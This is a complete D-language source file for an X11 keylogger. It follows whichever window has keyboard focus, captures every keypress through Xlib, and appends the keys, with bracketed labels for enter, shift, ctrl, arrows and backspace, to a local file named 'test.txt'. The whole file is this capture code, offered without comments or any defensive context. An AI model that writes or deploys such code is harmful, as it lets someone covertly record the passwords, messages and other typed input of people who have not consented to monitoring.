import std.stdio;
import x11.X;
import x11.keysym;
import x11.Xlib;
import x11.Xutil;
import std.conv;
import std.file;

void main() {
	Display* d = XOpenDisplay(null);
    Window root = DefaultRootWindow(d);
    Window curFocus;
    char[17] buf;
    KeySym ks;
    XComposeStatus comp;
    int len;
    int revert;
	XGetInputFocus(d, &curFocus, &revert);
    XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
	while (true)
    {
        XEvent ev;
        XNextEvent(d, &ev);
        switch (ev.type) {
            case FocusOut:
                if (curFocus != root)
                    XSelectInput(d, curFocus, 0);
                XGetInputFocus(d, &curFocus, &revert);
                if (curFocus == PointerRoot)
                    curFocus = root;
                XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
                break;

            case KeyPress:
				len = XLookupString(&ev.xkey, buf.ptr, 16, &ks, &comp);
                string pressedkey = getKey(cast(int)ks);
				if (pressedkey != null) {
					std.file.append("test.txt", cast(void[])(pressedkey));
				} else {
                	buf[len]=0;
                	std.file.append("test.txt", cast(void[])(to!string(buf[0])));
				}
			default: break;
        }
    }
}

string getKey(int key) {
	switch (key) {
		case 65288: return "[backspace]";
		case 65293: return "[enter]";
		case 65506: return "[rshift]";
		case 65505: return "[lshift]";
		case 65361: return "[larrow]";
		case 65364: return "[darrow]";
		case 65363: return "[rarrow]";
		case 65362: return "[uarrow]";
		case 65509: return "[capslock]";
		case 65507: return "[lctrl]";
		case 65508: return "[rctrl]";
		default: return null;
	}
}
